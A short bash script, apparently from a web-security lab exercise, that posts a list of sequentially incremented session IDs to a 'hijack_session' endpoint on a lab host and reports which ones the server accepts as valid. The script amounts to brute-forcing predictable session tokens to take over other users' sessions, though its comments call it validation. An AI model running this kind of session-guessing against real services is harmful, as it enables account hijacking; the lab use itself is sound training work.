#!/bin/bash

# List of sessions to verify
sessions=(

"9207b15c-fc6d-41d0-ac1-6846225-17372872706"
"9207b15c-fc6d-41d0-ac1-6846225-17372872707"
"9207b15c-fc6d-41d0-ac1-6846225-17372872708"
"9207b15c-fc6d-41d0-ac1-6846225-17372872709"
"9207b15c-fc6d-41d0-ac1-6846225-17372872710"
"9207b15c-fc6d-41d0-ac1-6846225-17372872711"
)

# Endpoint to validate sessions (Replace with the actual URL or command)
validation_url="http://web0x01.hbtn/a1/hijack_session/"

# Loop through each session and validate
for session in "${sessions[@]}"; do
    echo "Checking session: $session"

    # Perform the validation (replace curl with the actual command if necessary)
    response=$(curl -s -X POST "$validation_url" -d "session_id=$session")

    # Check if the session is valid based on the response
    if [[ $response == *"valid"* ]]; then
        echo "Session $session is VALID"
    else
        echo "Session $session is INVALID"
    fi
done
